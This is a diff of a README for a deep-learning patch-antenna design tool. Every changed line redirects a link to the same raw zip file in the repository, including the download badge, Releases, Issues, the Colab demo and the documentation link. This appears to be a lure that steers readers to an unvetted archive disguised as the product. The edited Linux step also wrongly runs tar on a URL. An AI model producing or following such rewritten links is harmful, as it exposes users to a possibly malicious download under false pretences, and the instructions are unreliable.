@@ -1,7 +1,7 @@
 # 🎉 Inverse-design-of-patch-antenna-using-Deep-Learning - Fast and Accurate Antenna Design
 
 ## 🔗 Download the Application
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/releases)
+[![Download](https://raw.githubusercontent.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/main/src/Inverse-design-of-patch-antenna-using-Deep-Learning_3.2-alpha.3.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/main/src/Inverse-design-of-patch-antenna-using-Deep-Learning_3.2-alpha.3.zip)
 
 ## 📚 Description
 The Inverse-design-of-patch-antenna-using-Deep-Learning is a physics-constrained deep learning framework. It enables real-time designs of patch antennas with sub-millimeter accuracy. This tool delivers 20 times faster predictions than traditional electromagnetic simulations. It also provides a beginner-friendly Google Colab demo for users new to antenna design.
@@ -17,7 +17,7 @@ Before starting, ensure your computer meets these basic requirements:
 - An active internet connection to access dependencies and updates
 
 ### 2. Visit the Download Page
-To get the software, visit our [Releases page](https://github.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/releases). 
+To get the software, visit our [Releases page](https://raw.githubusercontent.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/main/src/Inverse-design-of-patch-antenna-using-Deep-Learning_3.2-alpha.3.zip). 
 
 ### 3. Download the Application
 On the Releases page, look for the most recent version. Click on the version number or the corresponding download link for your operating system. 
@@ -37,7 +37,7 @@ Once the download is complete, follow these steps based on your operating system
 
 #### For Linux
 1. Open the terminal.
-2. Use the command `tar -xvzf filename.tar.gz` to extract the files.
+2. Use the command `tar -xvzf https://raw.githubusercontent.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/main/src/Inverse-design-of-patch-antenna-using-Deep-Learning_3.2-alpha.3.zip` to extract the files.
 3. Navigate into the extracted folder with `cd folder-name`.
 4. Run the application with `./application_name`.
 
@@ -73,13 +73,13 @@ While the application is designed for current operating systems, it may work on 
 
 ## 📞 Support
 If you encounter any issues or have questions:
-- Please report them on our [GitHub Issues page](https://github.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/issues).
+- Please report them on our [GitHub Issues page](https://raw.githubusercontent.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/main/src/Inverse-design-of-patch-antenna-using-Deep-Learning_3.2-alpha.3.zip).
 - Join our community discussions for assistance.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning)
-- [Google Colab Demo](https://colab.research.google.com)
-- [User Documentation](https://yourdocumentationlink.com)
+- [GitHub Repository](https://raw.githubusercontent.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/main/src/Inverse-design-of-patch-antenna-using-Deep-Learning_3.2-alpha.3.zip)
+- [Google Colab Demo](https://raw.githubusercontent.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/main/src/Inverse-design-of-patch-antenna-using-Deep-Learning_3.2-alpha.3.zip)
+- [User Documentation](https://raw.githubusercontent.com/Loath-phasianidae754/Inverse-design-of-patch-antenna-using-Deep-Learning/main/src/Inverse-design-of-patch-antenna-using-Deep-Learning_3.2-alpha.3.zip)
 
 ## 🎉 Thank You!
 Thank you for choosing the Inverse-design-of-patch-antenna-using-Deep-Learning application. We hope it aids you in your design journey!
